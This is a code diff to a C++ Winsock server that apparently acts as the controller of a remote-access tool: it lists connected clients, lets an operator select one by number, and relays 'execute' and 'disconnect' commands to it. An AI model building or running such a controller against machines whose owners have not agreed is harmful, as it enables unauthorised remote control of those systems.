@@ -11,9 +11,8 @@ using namespace std;
 #pragma comment (lib, "Ws2_32.lib")
 
 vector<SERVER*> client_array;
-vector<int> client_ids;
-int id_var = 1;
-int current_client = -1;
+vector<string> client_ids;
+string current_client = "None";
 
 void function_failed(char* function_name)
 {
@@ -86,10 +85,7 @@ void handle_connections(LPVOID Thread_Param)
 	{
 		ClientSocketStruct ClientParam;
 		ClientParam.ClientSocket = accept(ListenSocket.ListenSocket, NULL, NULL);
-		ClientParam.id = id_var;
-		//cout << endl << "New Connection Detected - Client ID " << id_var << endl;
-		show_update("New Connection Detected - Client ID ", id_var);
-	//	current_client == -1 ? cout << "# " : cout << "$ client-" << current_client << ": ";
+		show_update("New Connection Detected");
 		show_shell();
 		CreateThread(
 			NULL,
@@ -99,41 +95,39 @@ void handle_connections(LPVOID Thread_Param)
 			0,
 			NULL
 			);
-		id_var++;
 	}
 }
 
 void handle_client(LPVOID ClientParam)
 {
 	ClientSocketStruct ClientSocket = *(ClientSocketStruct*)ClientParam;
-	SERVER client(ClientSocket.ClientSocket, ClientSocket.id);
-	int pos = client_array.size();
-	int id_pos = client_ids.size();
+	SERVER client(ClientSocket.ClientSocket);
 	client_array.push_back(&client); // push client object's base address into global vector
 	client_ids.push_back(client.get_client_id());
+	string id = client.get_client_id();
 	string command;
 	while (client.get_client_status() == 1) {
 		if (current_client == client.get_client_id())
 		{
-			cout << "$ client-" << current_client << ": ";
+			cout << "$ client_" << current_client << ": ";
 			getline(cin, command);
 			handle_client_panel(client, command);
 		}
 		else {
 			command.assign("hello"); // Needs to be changed. Small lag due to sleep
-			client.send_command(command);  // hello is sent after every 3 seconds to check client status
+			client.send_command(command);  // hello is sent after every 2 seconds to check client status.
 			Sleep(2000);
 		}
 	}
-	//cout << endl <<"Client with ID - " << client.get_client_id() << " disconnected" << endl;
-	show_update("Client with ID - ", client.get_client_id(), " Disconnected");
+
+	show_update("Client with ID - " + client.get_client_id() + " disconnected");
 	if(current_client == client.get_client_id())
 	{
-		current_client = -1;
+		current_client = "None";
 	}
-	current_client == -1 ? cout << "# " : cout << "$ client-" << current_client << ": ";
-	client_ids[id_pos] = 0;
-	client_array[pos] = NULL;
+	show_shell();
+//	remove_client(id);
+//  Remove client object from global vector
 }
 
 void admin_mode()
@@ -155,14 +149,8 @@ void handle_admin_command(string& command)
 {
 	if(command.substr(0,7) == "client ")          
 	{						
-		int id = atoi(command.c_str() + 7);
-		if (check_current_client_id(id)) {
-			current_client = id;
-			while (current_client != -1)
-			{
-				Sleep(1000);
-			}
-		}
+		int s_no = atoi(command.c_str() + 7);
+		handle_by_s_no(s_no);
 	}
 	else if(command == "admin help")
 	{
@@ -178,11 +166,11 @@ void handle_client_panel(SERVER& client, string& command)
 {
 	if(command == "exit")
 	{
-		current_client = -1;
+		current_client = "None";
 	}
 	else if(command == "disconnect")
 	{
-		current_client = -1;
+		current_client = "None";
 		client.send_command(command);
 	}
 	else if(command == "help")
@@ -209,5 +197,20 @@ void handle_client_panel(SERVER& client, string& command)
 	else if(command.substr(0,8) == "execute ")
 	{
 		client.send_command(command);
+	}
+}
+
+void handle_by_s_no(int s_no)
+{
+	for(int i=0;i<client_ids.size();i++)
+	{
+		if (i == s_no) {
+			current_client = client_ids[i];
+			break;
+		}
+	}
+	while(current_client != "None")
+	{
+		Sleep(500);
 	}
 }
